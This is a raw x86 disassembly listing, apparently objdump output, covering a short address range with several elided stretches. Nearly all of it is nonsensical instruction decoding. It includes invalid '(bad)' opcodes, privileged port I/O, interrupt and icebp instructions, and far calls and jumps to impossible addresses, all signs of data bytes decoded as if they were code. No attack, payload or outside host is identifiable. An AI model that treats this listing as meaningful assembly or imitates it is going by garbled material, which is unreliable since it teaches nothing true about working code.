  42042d:	cli    
  42042e:	mov    edx,0xd5560c0a
  420433:	jg     0x4203f6
  420435:	data16 in al,0x77
  420438:	pop    ecx
  420439:	outs   dx,BYTE PTR ds:[esi]
  42043a:	cmp    al,0xf0
  42043c:	bound  esp,QWORD PTR [eax-0xc]
  42043f:	iret   
  420440:	adc    eax,0x1966a669
  420445:	add    bl,dh
  420447:	mov    dh,0x9c
  420449:	sub    DWORD PTR [edx],edi
  42044b:	cmp    al,0xd8
  42044d:	in     al,0xe6
  42044f:	adc    BYTE PTR [eax+0x37],dh
  420452:	pop    eax
  420453:	xor    BYTE PTR [eax+0x54b4d256],dh
  420459:	add    BYTE PTR [ecx-0x64],bh
  42045c:	aas    
  42045d:	cmp    esi,DWORD PTR [edx-0x6f038f2e]
  420463:	pop    ecx
  420464:	and    esp,edx
  420466:	jle    0x420430
  420468:	xor    DWORD PTR [ecx+0x55],esi
  42046b:	sbb    DWORD PTR [edi+0x6f],esi
  42046e:	xor    al,0xfd
  420470:	and    dl,BYTE PTR ds:0xeae82352
  420476:	repz adc esp,DWORD PTR [ebp+0x6d]
  42047a:	sub    bh,ah
  42047c:	sbb    dl,dh
  42047e:	xchg   esi,eax
  42047f:	fidivr DWORD PTR [eax]
  420481:	retf   0x4003
  420484:	lahf   
  420485:	lahf   
  420486:	shl    BYTE PTR [edx-0x78],cl
  420489:	scas   al,BYTE PTR es:[edi]
  42048a:	inc    ebx
  42048b:	cmp    edx,DWORD PTR [edx]
  42048d:	fisub  WORD PTR [eax+eiz*4-0x32]
	...
  4204f1:	add    BYTE PTR [eax],al
  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	lahf   
  420501:	rcl    dh,cl
  420503:	push   ds
  420504:	jo     0x42055e
  420506:	add    DWORD PTR [eax],eax
  420508:	add    eax,0x79000001
  42050d:	mov    ds:0xf123d5f6,eax
  420512:	dec    esp
  420513:	out    dx,eax
  420514:	xchg   DWORD PTR [eax-0x2e4b1fe6],eax
  42051a:	xchg   ecx,eax
  42051c:	in     al,0x3a
  42051e:	push   ebp
  42051f:	aad    0x66
  420521:	out    dx,eax
  420522:	cmp    DWORD PTR [edx-0x5a],edx
  420525:	je     0x420537
  420527:	ss popf 
  420529:	adc    cl,BYTE PTR [eax+0x41]
  42052c:	ja     0x42053a
  42052e:	mov    ecx,0x21c29b15
  420533:	stos   BYTE PTR es:[edi],al
  420534:	sbb    bl,BYTE PTR es:[esi]
  420537:	and    bh,BYTE PTR [edx+0x52]
  42053a:	push   edx
  42053b:	mov    BYTE PTR [ecx+0x26],bh
  42053e:	sub    eax,esi
  420540:	hlt    
  420541:	jo     0x4204d6
  420543:	jmp    0xcfc944a5
  420548:	jp     0x420597
  42054a:	sub    eax,0xce3d8127
  42054f:	mov    BYTE PTR [edx],dl
  420551:	pop    eax
  420552:	push   0x57d59f89
  420557:	shr    DWORD PTR [eax+edi*2-0x18457d71],cl
  42055e:	sbb    al,0x89
  420560:	and    BYTE PTR ds:0x43574004,dh
  420566:	mov    ds:0x963d36d7,al
  42056b:	xor    ebx,0x2a98472f
  420571:	xor    BYTE PTR [esi-0x47],bl
  420574:	lea    edx,[ebp+0x76]
  420577:	pusha  
  420578:	imul   esp,DWORD PTR [edx+0x1a],0x1a58f1c1
  42057f:	in     al,dx
  420580:	mov    ebx,0xdeace8ae
  420585:	out    dx,al
  420586:	inc    ebp
  420587:	test   BYTE PTR [eax-0x34],dh
  42058a:	adc    DWORD PTR [eax],ebx
  42058c:	and    DWORD PTR [edx],edx
  42058e:	push   ecx
  42058f:	(bad)  
  420590:	cmp    eax,0x5be7fd56
  420595:	xchg   esi,eax
  420596:	mov    BYTE PTR [esi+0x1c],cl
  420599:	fmul   QWORD PTR [ecx+0x336a92aa]
  42059f:	jno    0x4205eb
  4205a1:	in     al,dx
  4205a2:	loope  0x42056c
  4205a4:	shl    BYTE PTR [edx-0x1903cfff],0x12
  4205ab:	aas    
  4205ac:	jne    0x42061d
  4205ae:	xchg   esp,eax
  4205af:	push   cs
  4205b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205b1:	repz cdq 
  4205b3:	clc    
  4205b4:	sbb    DWORD PTR [ebx+0x54],ebp
  4205b7:	cld    
  4205b8:	call   0x465a:0xf24de0a4
  4205bf:	sbb    BYTE PTR [edi-0x14],al
  4205c2:	out    dx,eax
  4205c3:	pop    eax
  4205c4:	jmp    0xe5ce2914
  4205c9:	push   ebx
  4205ca:	jp     0x42055d
  4205cc:	pop    esp
  4205cd:	lock mov edx,0xb1389e3e
  4205d3:	inc    esp
  4205d4:	mov    al,ds:0x8feff848
  4205d9:	cmp    ebx,DWORD PTR [ecx+eax*8-0x1857a494]
  4205e0:	xor    al,0x12
  4205e2:	dec    eax
  4205e3:	sbb    DWORD PTR [esi],edi
  4205e5:	neg    ecx
  4205e7:	and    DWORD PTR [eax+eax*2],ebx
  4205ea:	or     eax,0xf4e3074d
  4205ef:	sar    BYTE PTR [ecx+0x39],1
  4205f2:	fiadd  WORD PTR [eax]
  4205f4:	jp     0x4205c4
  4205f6:	in     ax,0x0
  4205f9:	(bad)  [edi]
  4205fb:	sub    al,0x39
  4205fd:	in     eax,dx
  4205fe:	push   ecx
  4205ff:	icebp  
  420600:	xor    edi,DWORD PTR [ecx+0x42705260]
  420606:	sar    DWORD PTR [ecx],1
  420608:	pop    es
  420609:	add    eax,0xf617c1c2
  42060e:	cmp    al,0xe1
  420610:	inc    ebp
	...
  420671:	add    BYTE PTR [eax],al
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	sbb    DWORD PTR [ebx],0x5975c128
  420686:	add    DWORD PTR [eax],eax
  420688:	add    eax,0xd3000001
  42068d:	lock pop ebx
  42068f:	fwait
  420690:	ins    DWORD PTR es:[edi],dx
  420691:	mov    ebx,0x1db60df
  420696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420697:	int    0xce
  420699:	mov    ds:0x31007b8a,eax
  42069e:	add    BYTE PTR [ebx+edx*2],dl
  4206a1:	cdq    
  4206a2:	add    DWORD PTR [ebp+0x3c],0x39
  4206a6:	scas   al,BYTE PTR es:[edi]
  4206a7:	jg     0x420654
  4206a9:	in     al,0xf9
  4206ab:	repz jno 0x4206f0
  4206ae:	push   esi
  4206af:	cdq    
  4206b0:	jg     0x420662
  4206b2:	mov    eax,0x7368686b
  4206b7:	sub    eax,0xd19009e8
  4206bc:	mov    cl,0x2c
  4206be:	lds    ecx,FWORD PTR [edx]
  4206c0:	dec    DWORD PTR [edi-0x62]
  4206c3:	(bad)  
  4206c4:	addr16 leave 
  4206c6:	adc    BYTE PTR [eax-0x18],bl
  4206c9:	retf   
  4206ca:	int3   
  4206cb:	mov    dl,0x69
  4206cd:	jecxz  0x420735
  4206cf:	pop    ss
  4206d0:	dec    esp
  4206d1:	push   ecx
  4206d2:	shl    ebx,0xac
  4206d5:	mov    cl,0x4a
  4206d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206d8:	ins    BYTE PTR es:[edi],dx
  4206d9:	mul    BYTE PTR [edx-0x275dbb5d]
  4206df:	fiadd  DWORD PTR [edi-0x2da0a66f]
  4206e5:	daa    
  4206e6:	aas    
  4206e7:	fisttp WORD PTR ds:0x5d646967
  4206ed:	sub    al,0x5a
  4206ef:	pop    eax
  4206f0:	lea    edx,[esi-0x5c]
  4206f3:	call   0x8f96:0x94a8194c
  4206fa:	leave  
  4206fb:	push   ebp
  4206fc:	sbb    al,0xa
  4206fe:	aam    0x1d
  420700:	data16 shr ah,cl
  420703:	out    dx,eax
  420704:	jnp    0x4206fa
  420706:	cs in  al,0xd
  420709:	enter  0x70d,0xfb
  42070d:	adc    al,0x6c
  42070f:	test   BYTE PTR [ecx+0x2d],al
  420712:	xor    eax,0x3f1ffe58
  420717:	push   eax
  420718:	push   edi
  420719:	inc    ecx
  42071a:	arpl   WORD PTR [edx-0x6],sp
  42071d:	pop    ecx
  42071e:	jno    0x4206e2
  420720:	mov    dl,bh
  420722:	add    cl,BYTE PTR [ebp+0x20d92317]
  420728:	dec    dh
  42072a:	lea    edi,cs:[edi]
  42072d:	sbb    edx,edx
  42072f:	cdq    
  420730:	fsub   QWORD PTR [ebp-0x1638309]
  420736:	retf   
  420737:	or     edi,DWORD PTR [esi]
  420739:	out    dx,al
  42073a:	lods   eax,DWORD PTR ds:[esi]
  42073b:	icebp  
  42073c:	pop    eax
  42073d:	mov    gs,WORD PTR [ecx+0x6a40f148]
  420743:	push   cs
  420744:	into   
  420745:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420746:	sbb    eax,0x198ab2ae
  42074b:	dec    edx
  42074c:	jnp    0x420716
  42074e:	fnstenv [eax-0x79573ee1]
  420754:	adc    DWORD PTR [eax],esi
  420756:	adc    eax,0x6a66890a
  42075b:	je     0x4206fa
  42075d:	cmp    edi,ebx
  42075f:	mov    ebp,0xd9098939
  420764:	jl     0x4207a6
  420766:	push   es
  420767:	push   cs
  420768:	xchg   edx,eax
  420769:	sahf   
  42076a:	loop   0x4207c9
  42076c:	mov    eax,0x58f54b03
  420771:	sti    
  420772:	mov    eax,ds:0xdbee5d9a
  420777:	or     al,0x58
  420779:	or     BYTE PTR [ebp+0x414b9c8f],cl
  42077f:	cmc    
  420780:	dec    esi
  420781:	inc    edx
  420782:	fwait
  420783:	inc    esi
  420784:	mov    ebp,0xfaab30e8
  420789:	pop    ebx
  42078a:	dec    eax
  42078b:	mov    ss,WORD PTR [ecx]
  42078d:	mov    edi,0x8c3c0c
	...
  4207f2:	add    BYTE PTR [eax],al
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	aaa    
  420801:	cmc    
  420802:	add    dl,ch
  420804:	jp     0x420860
  420806:	add    DWORD PTR [eax],eax
  420808:	add    eax,0x36000001
  42080d:	out    0xcc,eax
  42080f:	pop    ss
  420810:	stos   BYTE PTR es:[edi],al
  420811:	push   ss
  420812:	call   0x2173:0x6e67adcf
  420819:	add    al,0xe5
  42081b:	pushf  
  42081c:	fsub   DWORD PTR [ecx-0x1fdb6558]
  420822:	and    eax,0xf075a97
  420827:	mov    dh,0x39
  420829:	jl     0x42086f
  42082b:	sbb    DWORD PTR [ebx],ecx
  42082d:	test   DWORD PTR [eax-0x11663370],0x2cc2e75a
  420837:	push   0xffffffaa
  420839:	aam    0x0
  42083b:	pusha  
  42083c:	aam    0x89
  42083e:	and    al,bh
  420840:	fmul   DWORD PTR [edi]
  420842:	call   0xbe177d04
  420847:	faddp  st(7),st
  420849:	inc    eax
  42084a:	mov    edx,0x4af27548
  42084f:	inc    esp
  420850:	not    BYTE PTR [eax+0x30]
  420853:	xor    eax,0xbc744965
  420858:	inc    ebx
  420859:	rol    dl,0x9b
  42085c:	push   0xfffffffb
  42085e:	pop    es
  42085f:	clc    
  420860:	aad    0xae
  420862:	mov    dl,BYTE PTR [ecx+0x421bbd77]
  420868:	mov    edi,0xc128abdf
  42086d:	sbb    al,0x8e
  42086f:	push   ds
  420870:	icebp  
  420871:	call   0xcc6c8676
  420876:	sub    ebx,ebx
  420878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420879:	adc    eax,0xfef86216
  42087e:	fist   DWORD PTR [eax-0x7fc8e3a4]
  420884:	gs adc cl,dl
  420887:	xor    edx,DWORD PTR [ebx+0x66a8b3fc]
  42088d:	xor    DWORD PTR [esi+eax*4-0x1cfd99d1],ebx
  420894:	pop    esi
  420895:	lea    ebp,[ebx+esi*8+0x45f5dbeb]
  42089c:	jmp    0xfff8215b
  4208a1:	pop    ebx
  4208a2:	sub    DWORD PTR [ebx+0xe3eff5e],esi
  4208a8:	ja     0x420920
  4208aa:	pop    edi
  4208ab:	pop    eax
  4208ac:	add    edx,DWORD PTR [esi-0x5dfa8a46]
  4208b2:	mov    bl,0x7b
  4208b4:	mov    cl,0xb7
  4208b6:	mov    al,BYTE PTR ds:0x5b24fc6d
  4208bc:	(bad)  
  4208bd:	in     eax,0x61
  4208bf:	or     ebx,DWORD PTR [edx-0x6b27fa1a]
  4208c5:	cmp    DWORD PTR [edi-0x11d73609],esp
  4208cb:	sub    DWORD PTR [edx+0x57dfb04f],ebp
  4208d1:	mov    DWORD PTR [edx-0x6b],eax
  4208d4:	push   ds
  4208d5:	push   cs
  4208d6:	jp     0x42088f
  4208d8:	lahf   
  4208d9:	add    ecx,DWORD PTR [ebx-0x3981b95e]
  4208df:	inc    DWORD PTR [edi-0x19]
  4208e2:	inc    edi
  4208e3:	and    ecx,DWORD PTR [ecx]
  4208e5:	push   ebp
  4208e6:	inc    edi
  4208e7:	out    0x1d,eax
  4208e9:	std    
  4208ea:	test   BYTE PTR [ebx-0x11c7b27],cl
  4208f0:	jecxz  0x420879
  4208f2:	imul   edi,DWORD PTR [ebx+0x25],0x0
  4208f6:	xchg   edi,ebp
  4208f8:	pop    ebx
  4208f9:	pop    esp
  4208fa:	dec    eax
  4208fb:	ror    BYTE PTR [ebx],cl
  4208fd:	xor    eax,0x85777fe4
  420902:	push   0x95102d8d
  420907:	jno    0x42095d
  420909:	or     ebp,DWORD PTR [ecx]
  42090b:	mov    esp,0x514c32a2
  420910:	or     eax,DWORD PTR [eax]
	...
  420972:	add    BYTE PTR [eax],al
  420974:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0xe2
  420981:	out    dx,eax
  420982:	pop    ebx
  420983:	in     al,dx
  420984:	jg     0x4209e1
  420986:	add    DWORD PTR [eax],eax
  420988:	add    eax,0xdf000001
  42098d:	icebp  
  42098e:	sub    cl,BYTE PTR [ebx]
  420990:	jge    0x4209fd
  420992:	pop    edx
  420993:	and    eax,0x2563126f
  420998:	jge    0x420923
  42099a:	data16 and al,0xd1
  42099d:	out    dx,al
  42099e:	jae    0x42096f
  4209a0:	out    dx,eax
  4209a1:	jns    0x4209b2
  4209a3:	leave  
  4209a4:	sti    
  4209a5:	fwait
  4209a6:	outs   dx,DWORD PTR ds:[esi]
  4209a7:	mov    dl,0xfc
  4209a9:	pop    edx
  4209aa:	cwde   
  4209ab:	imul   esi,DWORD PTR [esi+0x4],0x49f8237d
  4209b2:	stos   BYTE PTR es:[edi],al
  4209b3:	lods   al,BYTE PTR ds:[esi]
  4209b4:	stos   BYTE PTR es:[edi],al
  4209b5:	xchg   edx,eax
  4209b6:	and    BYTE PTR [ebx],0x35
  4209b9:	int    0x27
  4209bb:	jno    0x420964
  4209bd:	push   eax
  4209be:	out    dx,al
  4209bf:	inc    edi
  4209c0:	xchg   ebp,eax
  4209c1:	loopne 0x4209d7
  4209c3:	push   0x788f3f3c
  4209c8:	imul   edi,DWORD PTR ds:0xabf55034,0xd5742d4d
  4209d2:	sahf   
  4209d3:	cdq    
  4209d4:	inc    eax
  4209d5:	xchg   ecx,eax
  4209d6:	retf   0xf179
  4209d9:	outs   dx,DWORD PTR ds:[esi]
  4209da:	sub    ch,BYTE PTR [ebx-0x4523af29]
  4209e0:	inc    ecx
  4209e1:	mov    eax,0x72803e22
  4209e6:	add    ebx,esi
  4209e8:	idiv   bh
  4209ea:	jns    0x420a32
  4209ec:	jge    0x4209c5
  4209ee:	cdq    
  4209ef:	test   DWORD PTR [ebp+0x56],esi
  4209f2:	ins    DWORD PTR es:[edi],dx
  4209f3:	mov    esi,0x2316a76a
  4209f8:	cld    
  4209f9:	pop    ss
  4209fa:	mov    eax,ds
  4209fc:	test   BYTE PTR [edi+esi*4-0x6b69946f],cl
  420a03:	lahf   
  420a04:	out    0x74,eax
  420a06:	fdivr  st(6),st
  420a08:	mov    al,0x83
  420a0a:	not    edi
  420a0c:	and    esi,DWORD PTR [esi-0x31]
  420a0f:	and    DWORD PTR [eax+0x2b5b04b3],ecx
  420a15:	mov    dh,0xbe
  420a17:	fcomp  QWORD PTR [eax-0x52]
  420a1a:	icebp  
  420a1b:	into   
  420a1c:	or     BYTE PTR [eax],0xc0
  420a1f:	xchg   BYTE PTR [ebx+esi*2-0x2f],cl
  420a23:	xor    eax,0xac05e84c
  420a28:	lods   eax,DWORD PTR ds:[esi]
  420a29:	push   ds
  420a2a:	and    eax,0xeeb1412d
  420a2f:	add    eax,0x67084de1
  420a34:	je     0x420a70
  420a36:	mul    ebp
  420a38:	repz jne 0x420a74
  420a3b:	mov    ebp,0xa024ee52
  420a40:	and    BYTE PTR [edi],bl
  420a42:	push   es
  420a43:	pusha  
  420a44:	sub    ax,0xace
  420a48:	jge    0x420aa1
  420a4a:	push   0x2d75213
  420a4f:	jmp    0x268e3229
  420a54:	pop    edx
  420a55:	push   ss
  420a56:	(bad)  
  420a58:	jmp    0x420abb
  420a5a:	shl    DWORD PTR [ebp+0x58],cl
  420a5d:	pop    eax
  420a5e:	lds    ebp,FWORD PTR [edi-0x25]
  420a61:	fisttp WORD PTR ds:0xe63dee2
  420a67:	xchg   ebx,eax
  420a68:	and    ebx,esi
  420a6a:	jne    0x420ad9
  420a6c:	aaa    
  420a6d:	mov    WORD PTR [edi],ds
  420a6f:	addr16 pop edi
  420a71:	mov    eax,ds:0x83d43c5
  420a76:	add    DWORD PTR [esi],0xffffff86
  420a79:	add    eax,0x2207f35b
  420a7e:	adc    eax,0xdcb88849
  420a83:	inc    ecx
  420a84:	fwait
  420a85:	pop    ecx
  420a86:	sbb    DWORD PTR [ecx-0x708b4bc4],0xffffffd7
  420a8d:	push   edx
  420a8e:	shl    BYTE PTR ds:0xc8,1
	...
  420af4:	fbstp  TBYTE PTR [edx]
  420af6:	scas   eax,DWORD PTR es:[edi]
  420af7:	adc    ebp,edi
  420af9:	lahf   
  420afa:	(bad)  
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	pop    ds
  420b01:	sahf   
  420b02:	nop
  420b03:	mov    eax,ds:0x15c84
  420b08:	add    eax,0x7c000001
  420b0d:	mov    bl,0x48
  420b0f:	push   esi
  420b10:	test   BYTE PTR [ebp+0x4881eaff],al
  420b16:	mov    ds:0x6cdd6d0,eax
  420b1b:	push   esi
  420b1c:	mov    ds:0x1ebf42dc,eax
  420b21:	fstp   DWORD PTR [ecx]
  420b23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b24:	push   esp
  420b25:	adc    BYTE PTR [esi+edx*4-0x4c],0x79
  420b2a:	inc    edi
  420b2b:	jecxz  0x420b6f
  420b2d:	xchg   edx,eax
  420b2e:	sbb    ch,BYTE PTR [esp+eiz*2+0x60]
  420b32:	pusha  
  420b33:	lods   al,BYTE PTR ds:[esi]
  420b34:	retf   
  420b35:	mov    esi,0x5a6257db
  420b3a:	repz xchg ebp,eax
  420b3c:	stos   DWORD PTR es:[edi],eax
  420b3d:	dec    edi
  420b3e:	sub    eax,0x2b8a0493
  420b43:	cmc    
  420b44:	cwde   
  420b45:	(bad)  
  420b46:	push   eax
  420b47:	fstp   QWORD PTR [edi]
  420b49:	not    dl
  420b4b:	imul   ecx,esi,0xfffffff7
  420b4e:	cmp    al,0x3a
  420b50:	out    0x87,al
  420b52:	and    DWORD PTR [edx-0x47],edi
  420b55:	pop    esp
  420b56:	clc    
  420b57:	xchg   esi,eax
  420b58:	mov    bl,0x8e
  420b5a:	in     eax,dx
  420b5b:	jo     0x420b25
  420b5d:	add    esi,0x767d4cd6
  420b63:	es cmp al,0x55
  420b66:	ret    0x7047
  420b69:	stc    
  420b6a:	bound  eax,QWORD PTR [edi+0x30]
  420b6d:	ror    BYTE PTR [edi],1
  420b6f:	hlt    
  420b70:	xsha256 (bad)
  420b71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b72:	adc    al,0x45
  420b74:	mov    esp,0xc1612829
  420b79:	shl    ebp,1
  420b7b:	or     eax,0x9e416afc
  420b81:	mov    ebp,0x9fc40c07
  420b86:	fmul   QWORD PTR ds:0x77c6e689
  420b8c:	push   0x8dfb4539
  420b91:	fsub   DWORD PTR [eax-0x1dc6f2bf]
  420b97:	pop    esp
  420b98:	mov    esi,0x1ef100c6
  420b9d:	or     eax,0x9ced2090
  420ba2:	lea    esi,[esp+ebp*1-0x7ebbd020]
  420ba9:	inc    ebp
  420baa:	add    al,0xf6
  420bac:	push   esp
  420bad:	je     0x420b94
  420baf:	jo     0x420b5f
  420bb1:	pop    edx
  420bb2:	adc    al,0xbd
  420bb4:	int    0x38
  420bb6:	outs   dx,BYTE PTR ds:[esi]
  420bb7:	mov    ch,0x12
  420bb9:	retf   0x45d3
  420bbc:	cs inc eax
  420bbe:	cvtps2pi mm3,xmm2
  420bc1:	cld    
  420bc2:	xor    ebp,ebp
  420bc4:	xchg   BYTE PTR [ebx-0x7ba954f4],ch
  420bca:	enter  0x11f9,0x5a
  420bce:	xor    DWORD PTR [ecx],esp
  420bd0:	out    dx,al
  420bd1:	cmp    bh,BYTE PTR [eax]
  420bd3:	outs   dx,DWORD PTR ds:[esi]
  420bd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bd5:	inc    esp
  420bd6:	sbb    eax,0xce2435e
  420bdb:	adc    DWORD PTR [esi+0x5bf3053e],edi
  420be1:	pop    edi
  420be2:	mov    BYTE PTR [esi-0x5],bh
  420be5:	mov    al,ds:0x5350e217
  420bea:	mov    WORD PTR [edi],cs
  420bec:	loop   0x420b6e
  420bee:	mov    bl,0x9f
  420bf0:	daa    
  420bf1:	popa   
  420bf2:	stos   DWORD PTR es:[edi],eax
  420bf3:	pop    esp
  420bf4:	mov    edi,0xa3fd4ca1
  420bf9:	repnz lock bound eax,QWORD PTR [ecx-0x419dd985]
  420c01:	mov    eax,ds:0x8295e633
  420c06:	enter  0xfe59,0x7a
  420c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c0b:	push   ss
  420c0c:	mov    bl,0xea
  420c0e:	jecxz  0x420bbd
  420c10:	add    eax,DWORD PTR [eax]
	...
  420c72:	add    BYTE PTR [eax],al
  420c74:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c7a:	mov    edx,0x1886e3f
  420c7f:	in     eax,0x96
  420c81:	dec    ecx
  420c82:	and    cl,BYTE PTR [edi+0x15d89]
  420c88:	add    eax,0x89000001
  420c8d:	xor    DWORD PTR [edi],ebp
  420c8f:	(bad)  es:[ebx]
  420c92:	sti    
  420c93:	push   0xffffffc5
  420c95:	sbb    al,0xae
  420c97:	out    0x35,al
  420c99:	mov    ebp,0xb9d214b5
  420c9e:	inc    dl
  420ca0:	sbb    al,0xf0
  420ca2:	mov    eax,0x308075f5
  420ca7:	or     al,bh
  420ca9:	pop    edx
  420caa:	push   edx
  420cab:	in     eax,0x6a
  420cad:	push   eax
  420cae:	sbb    eax,0x666ffd89
  420cb3:	xchg   ebx,eax
  420cb4:	adc    eax,0x5179682f
  420cb9:	dec    eax
  420cba:	lds    ebp,FWORD PTR [esi+0x1c0f0fce]
  420cc0:	push   0x53
  420cc2:	ret    
  420cc3:	pop    edx
  420cc4:	mov    eax,DWORD PTR [ebx+ebx*1-0x7cd85a7e]
  420ccb:	scas   eax,DWORD PTR es:[edi]
  420ccc:	mov    dl,0x43
  420cce:	aaa    
  420ccf:	rcr    DWORD PTR [edx-0x757bcb02],0x9c
  420cd6:	mov    bl,0xc7
  420cd8:	sub    eax,0xcae478d0
  420cdd:	jle    0x420c6c
  420cdf:	adc    eax,0xb3f6d1fd
  420ce4:	jo     0x420d23
  420ce6:	add    dh,BYTE PTR [ebp+0x2135e780]
  420cec:	lods   al,BYTE PTR ds:[esi]
  420ced:	ins    BYTE PTR es:[edi],dx
  420cee:	add    BYTE PTR [edi+0x39],cl
  420cf1:	dec    ebx
  420cf2:	jl     0x420cbf
  420cf4:	cmp    eax,0x2f02b5d6
  420cf9:	sahf   
  420cfa:	inc    esp
  420cfb:	cli    
  420cfc:	fcmovne st,st(7)
  420cfe:	pop    esp
  420cff:	(bad)  
  420d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d01:	sbb    DWORD PTR [esi+0x66f017a1],0x13
  420d08:	xor    DWORD PTR [ecx-0x10],esp
  420d0b:	push   edi
  420d0c:	push   es
  420d0d:	int    0x2
  420d0f:	jns    0x420d19
  420d11:	push   edx
  420d12:	pop    ebp
  420d13:	out    dx,eax
  420d14:	(bad)  
  420d15:	mov    ebx,0x3f63f3ca
  420d1a:	inc    esi
  420d1b:	fsub   DWORD PTR [esi-0x5cf28526]
  420d21:	outs   dx,DWORD PTR ds:[esi]
  420d22:	jp     0x420ca7
  420d24:	add    al,BYTE PTR [eax+0x79c9825a]
  420d2a:	(bad)  
  420d2b:	int3   
  420d2c:	loopne 0x420d46
  420d2e:	push   ebx
  420d2f:	stc    
  420d30:	jo     0x420d7f
  420d32:	test   BYTE PTR [ecx+eiz*1-0x58],ah
  420d36:	inc    ebx
  420d37:	sbb    BYTE PTR [esp+ebp*1],dl
  420d3a:	jle    0x420d77
  420d3c:	test   BYTE PTR [esi],0xad
  420d3f:	icebp  
  420d40:	cmp    DWORD PTR [ebx-0x367f261e],esi
  420d46:	outs   dx,DWORD PTR ds:[esi]
  420d47:	inc    esi
  420d48:	cmc    
  420d49:	in     eax,dx
  420d4a:	test   BYTE PTR [ebx+0x22d529fb],ah
  420d50:	lea    edx,[eax+0x3a]
  420d53:	loop   0x420db4
  420d55:	cmp    DWORD PTR ds:0xee7f2deb,0x92f6a0fd
  420d5f:	int3   
  420d60:	lods   eax,DWORD PTR ds:[esi]
  420d61:	jns    0x420d81
  420d63:	xor    esp,DWORD PTR [ecx]
  420d65:	cmp    eax,0x197d2886
  420d6a:	push   ebx
  420d6b:	test   al,0x88
  420d6d:	pop    ebx
  420d6e:	fwait
  420d6f:	cdq    
  420d70:	jmp    0x420d53
  420d72:	sub    eax,DWORD PTR [eax+0xd]
  420d75:	sbb    DWORD PTR [ebp+0x7c1f4070],eax
  420d7b:	xchg   DWORD PTR [ebx],ebx
  420d7d:	mov    esi,gs
  420d7f:	(bad)  
  420d80:	test   al,0xe8
  420d82:	push   eax
  420d83:	mov    bh,bl
  420d85:	adc    al,0xdc
  420d87:	ret    
  420d88:	retf   
  420d89:	inc    edx
  420d8a:	jg     0x420d76
  420d8c:	and    ch,BYTE PTR [ecx+0x232711]
	...
  420df2:	add    BYTE PTR [eax],al
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0xe19fe9fd
  420e04:	mov    ds,WORD PTR [esi+0x1]
  420e07:	add    BYTE PTR ds:0xa2000001,al
  420e0d:	rcr    BYTE PTR [esi],0x11
  420e10:	addr16 pop ebp
  420e12:	bound  ecx,QWORD PTR [esp+esi*2-0xc608c90]
  420e19:	pop    ecx
  420e1a:	mov    ds:0x5497a606,eax
  420e1f:	in     al,dx
  420e20:	lods   eax,DWORD PTR ds:[esi]
  420e21:	cmp    BYTE PTR [ebx-0x64],ch
  420e24:	mov    bh,0xda
  420e26:	scas   al,BYTE PTR es:[edi]
  420e27:	jecxz  0x420e36
  420e29:	stos   DWORD PTR es:[edi],eax
  420e2a:	or     dh,0x6f
  420e2d:	dec    esp
  420e2e:	jnp    0x420e31
  420e30:	cwde   
  420e31:	xor    edx,DWORD PTR [esi+0x4923879a]
  420e37:	add    BYTE PTR [ebx-0x1b7e0bc1],cl
  420e3d:	out    dx,eax
  420e3e:	cwde   
  420e3f:	jo     0x420ebf
  420e41:	mov    cl,BYTE PTR [ecx]
  420e43:	mov    dh,0xd
  420e45:	sub    BYTE PTR [esi],al
  420e47:	add    esp,DWORD PTR ds:0x19b0de3a
  420e4d:	fisttp QWORD PTR [edi+ebx*1-0x322f4f10]
  420e54:	push   ss
  420e55:	sar    BYTE PTR [ecx+0x4d],0x12
  420e59:	lock loopne 0x420de6
  420e5c:	inc    ebx
  420e5d:	xor    BYTE PTR [ecx],al
  420e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e60:	test   BYTE PTR [eax+0x722dbb95],dh
  420e66:	cmp    eax,0x5b24b6ce
  420e6b:	cmp    BYTE PTR [edi-0x4e],0xcb
  420e6f:	imul   esp,ecx,0x4d
  420e72:	fs push 0x8746d3ac
  420e78:	sub    edi,DWORD PTR [eax+0x9798da4]
  420e7e:	test   DWORD PTR [edx],ecx
  420e80:	xor    BYTE PTR [ebx],bh
  420e82:	jp     0x420e34
  420e84:	cdq    
  420e85:	jmp    0x420edb
  420e87:	dec    ebx
  420e88:	stos   DWORD PTR es:[edi],eax
  420e89:	sar    DWORD PTR [eax+0x6133775f],0x35
  420e90:	add    DWORD PTR [esi],edx
  420e92:	aaa    
  420e93:	jge    0x420f10
  420e95:	and    BYTE PTR [ecx+0x7],ch
  420e98:	mov    BYTE PTR ds:0x5abaa8a0,ch
  420e9e:	pop    es
  420e9f:	mov    al,0x91
  420ea1:	xor    BYTE PTR [edi],ch
  420ea3:	jns    0x420e94
  420ea5:	mov    edx,0x671f0cca
  420eaa:	xchg   ebx,eax
  420eab:	jl     0x420e33
  420ead:	shr    BYTE PTR [edx-0x760fdda7],cl
  420eb3:	arpl   WORD PTR [edi+0x41],bx
  420eb6:	in     al,dx
  420eb7:	jg     0x420f02
  420eb9:	xor    cl,cl
  420ebb:	push   ebp
